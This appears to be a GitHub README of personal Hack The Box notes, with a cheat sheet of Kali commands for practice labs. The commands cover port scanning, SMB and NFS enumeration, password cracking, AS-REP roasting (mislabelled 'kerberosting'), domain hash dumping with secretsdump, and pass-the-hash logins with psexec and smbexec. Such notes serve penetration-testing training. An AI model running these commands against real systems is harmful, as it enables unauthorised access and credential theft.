# HackTheBox

Hack The Box is an online platform allowing you to test your penetration testing skills and exchange ideas and methodologies with thousands of people in the security field.

<img src="https://www.hackthebox.eu/badge/image/134841" alt="Hack The Box">

:)

Link to HTB: \
[http://hackthebox.eu/](http://hackthebox.eu/) 

Tools I use: 
* [Kali Linux](https://www.kali.org/) (Linux distro for pentesting) 
* [Commando VM](https://github.com/fireeye/commando-vm) (Windows VM for pentesting)

Help resources: 
* [IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA) (Youtube walkthrough videos) 
* [The Cyber Mentor](https://www.youtube.com/channel/UC0ArlFuFYMpEewyRBzdLHiw) (Youtube tutorials)
* [Rapid7](https://www.rapid7.com/db/) (Vulnerability & Exploit Database)
* [Exploit DB](https://www.exploit-db.com/) (Exploit Database)
* [Hack the Box Forums](https://forum.hackthebox.eu/)

### Kali Linux commands

Cracking zipfile with fcrackzip:
``` fcrackzip -D -p ~/Downloads/rockyou.txt noise_samples.zip ```

Portscanning target with nmap
```
nmap -sC -sV [targetIP]
```
```
nmap -A -T4 -p- [targetIP]
```
nmap for when you see rpcbind
```
nmap -sV --script=nfs-showmount [targetIP]
```
Show shares
```
showmount -e [targetIP]
```

Mount a share
```
mount -t nfs [targetIP]:/[sharepath] /[localmountpath]
```


FTP
```
ftp [targetIP]
```
SMB Client
```
smbclient -L [targetIP] -U [username]
```
Query netbios names
```
nmblookup -A [targetIP]
```
Finding open shares
```
nbtscan [targetIP]
```
Enumerate samba shares
```
smbmap -H [targetIP]
```
Windows enumeration
```
enum4linux -a [targetIP]
```
Locate path of files
``` 
locate [string]
```
Enumerating users with impacket
```
python3 ./samrdump.py [targetIP]
```
Get password hash from user using kerberosting
```
python3 ./GetNPUsers.py DOMAIN/username -no-pass -dc-ip [dcIPaddress]
```
Crack a password hash
```
john -wordlist=/usr/share/wordlists/rockyou.txt [filewithhashes.txt]
```
Connect over winrm
```
evil-winrm -u [username] -i [targetIP]
```
Connect over winrm, but with access to a folder and its files
```
evil-winrm -i [targetIP] -u USER -p PASSWORD -s /usr/share/windows-resources/powersploit/Privesc/
```

Download all files from smbshare
```
recurse on
prompt off
mask *
mget *
```
Using secretsdump to dump domain hashes (needs acc with DC SYNC permissions)
```
impacket-secretsdump "DOMAIN/useraccount:Password"@ipadresss
```


Connect with psexec or smbexec using pass the hash
```
python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff username@ipadress
python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff username@ipadress
```

